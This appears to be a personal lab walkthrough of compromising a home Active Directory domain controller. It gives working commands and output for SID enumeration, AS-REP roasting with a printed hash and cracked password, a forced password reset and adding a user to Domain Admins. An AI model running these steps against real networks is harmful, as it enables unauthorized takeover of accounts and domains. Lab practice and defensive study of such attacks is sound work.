# Nmap

```
PORT     STATE SERVICE           VERSION
42/tcp   open  tcpwrapped
53/tcp   open  domain            Simple DNS Plus
80/tcp   open  http              Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-12-16 01:05:52Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: tinker.lab0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http          Microsoft IIS httpd 10.0
| ssl-cert: Subject: commonName=TinkerDC-01
| Not valid before: 2024-12-15T00:18:27
|_Not valid after:  2025-06-16T00:18:27
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds      Windows Server 2022 Standard Evaluation 20348 microsoft-ds (workgroup: TINKER)
464/tcp  open  kpasswd5?
515/tcp  open  printer           Microsoft lpd
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: tinker.lab0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
|_ssl-date: 2024-12-16T01:06:40+00:00; +10h00m00s from scanner time.
| ssl-cert: Subject: commonName=TinkerDC-01.tinker.lab
| Not valid before: 2024-12-15T00:35:49
|_Not valid after:  2025-06-16T00:35:49
| rdp-ntlm-info: 
|   Target_Name: TINKER
|   NetBIOS_Domain_Name: TINKER
|   NetBIOS_Computer_Name: TINKERDC-01
|   DNS_Domain_Name: tinker.lab
|   DNS_Computer_Name: TinkerDC-01.tinker.lab
|   DNS_Tree_Name: tinker.lab
|   Product_Version: 10.0.20348
|_  System_Time: 2024-12-16T01:05:58+00:00
MAC Address: 00:0C:29:84:54:13 (VMware)
Service Info: Host: TINKERDC-01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: TINKERDC-01, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:84:54:13 (VMware)
| smb-os-discovery: 
|   OS: Windows Server 2022 Standard Evaluation 20348 (Windows Server 2022 Standard Evaluation 6.3)
|   Computer name: TinkerDC-01
|   NetBIOS computer name: TINKERDC-01\x00
|   Domain name: tinker.lab
|   Forest name: tinker.lab
|   FQDN: TinkerDC-01.tinker.lab
|_  System time: 2024-12-15T17:05:59-08:00
|_clock-skew: mean: 11h35m59s, deviation: 3h34m40s, median: 9h59m59s
| smb2-time: 
|   date: 2024-12-16T01:05:59
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

# SMB Enumeration

```shell
┌──(xle0x㉿babe)-[~/active_directory/tinker.lab]
└─$ nxc smb 192.168.115.130 -u "guest" -p '' --shares

SMB         192.168.115.130 445    TINKERDC-01      [*] Windows Server 2022 Standard Evaluation 20348 x64 (name:TINKERDC-01) (domain:tinker.lab) (signing:True) (SMBv1:True)
SMB         192.168.115.130 445    TINKERDC-01      [+] tinker.lab\guest: (Guest)
SMB         192.168.115.130 445    TINKERDC-01      [*] Enumerated shares
SMB         192.168.115.130 445    TINKERDC-01      Share           Permissions     Remark
SMB         192.168.115.130 445    TINKERDC-01      -----           -----------     ------
SMB         192.168.115.130 445    TINKERDC-01      ADMIN$                          Remote Admin
SMB         192.168.115.130 445    TINKERDC-01      C$                              Default share
SMB         192.168.115.130 445    TINKERDC-01      IPC$                            Remote IPC
SMB         192.168.115.130 445    TINKERDC-01      NETLOGON                        Logon server share 
SMB         192.168.115.130 445    TINKERDC-01      Notes           READ            
SMB         192.168.115.130 445    TINKERDC-01      SYSVOL                          Logon server share 
```

```shell
┌──(xle0x㉿babe)-[~/active_directory/tinker.lab]
└─$ smbclient //192.168.115.130/Notes -U 'guest'
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Dec 16 04:53:51 2024
  ..                                  D        0  Mon Dec 16 04:02:23 2024

		15564031 blocks of size 4096. 12475601 blocks available
smb: \> exit                                                    
```


# Brute force ids to get a valid list of users

```shell
impacket-lookupsid guest@192.168.115.130 | grep "SidTypeUser" | cut -d " " -f2 | cut -d "\\" -f2
```


```shell
Administrator
Guest
krbtgt
TINKERDC-01$
domain-admin
ammar.mohamed
khaled.ahmed
```

# Asreproastable Users



```shell
impacket-GetNPUsers -no-pass -usersfile valid-users.txt tinker.lab/
```

the hash for khaled.ahmed:

```
$krb5asrep$23$khaled.ahmed@TINKER.LAB:d947a4990a7fddc158948edd1e4ef9dd$ab0855df4a9d45f7ac9bb068b3398ca6f76cfa1ab670b6a175682ebf0cb301dda77cc2aa346d9e37440c4ab20efdecb332a418c9c4296715c7c5f4c75c4925baf94bb3ecfc3f320a1d99ba2e25d8f55398b4f569c771c80fbdf16efd6b9044131dc6ff35b4383eb919c957b06ec70c330839f0267883d9300e077518420da243e8ad76d4f8e6e83ff8dd91c949db71cce2348ff58620b4018e6537521ea31439d87515cda16afaa4c3e1a262038062ff9178e55bb19f88a50a657f753fbdb01df9eb187122ceae780ab3f148d9b62db98cc06f23c9acda480efe6cfcc5731a7b5e703e0ff5bd3c0f
```

cracking the hash:

```shell
john khaled.ahmed-asrep.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
and the password is: `batman!123`

# Bloodhound enumeration with khaled user.

```shell
bloodhound-python -u "khaled.ahmed" -p 'batman!123' -c All -d tinker.lab -ns 192.168.115.130
```

Ingesting json files in bloodhound.

found that khaled.ahmed user can change ammar.mohamed password, lets change it:
![](Pasted%20image%2020241215192724.png)
```shell
net rpc password "ammar.mohamed" "P@ssw0rd" -U "tinker.lab"/"khaled.ahmed"%'batman!123' -S 192.168.115.130
```

check if the password is now correct for ammar.mohamed:

```shell
┌──(xle0x㉿babe)-[~/active_directory/tinker.lab/bloodhound]
└─$ nxc smb 192.168.115.130 -u "ammar.mohamed" -p 'P@ssw0rd'         

SMB         192.168.115.130 445    TINKERDC-01      [*] Windows Server 2022 Standard Evaluation 20348 x64 (name:TINKERDC-01) (domain:tinker.lab) (signing:True) (SMBv1:True)
SMB         192.168.115.130 445    TINKERDC-01      [+] tinker.lab\ammar.mohamed:P@ssw0rd
```

yeah it's correct, now let's see what ammar can do!

# AddMember misconfiguration

ammar is a member of Leaders group and it has a permission to add a new member to the Domain Admins, Let's exploit it and add ammar to the domain admins!
![](Pasted%20image%2020241215192910.png)

```shell
net rpc group addmem "Domain Admins" "ammar.mohamed" -U "tinker.lab"/"ammar.mohamed"%"P@ssw0rd" -S 192.168.115.130
```

Let's check if ammar now is a domain admin by for example rdp or winrm to the domain controller!

```shell
xfreerdp3 /u:"ammar.mohamed" /p:"P@ssw0rd"  /v:192.168.115.130
```

```shell
evil-winrm -u ammar.mohamed -p 'P@ssw0rd' -i 192.168.115.130
```


yes!!!!!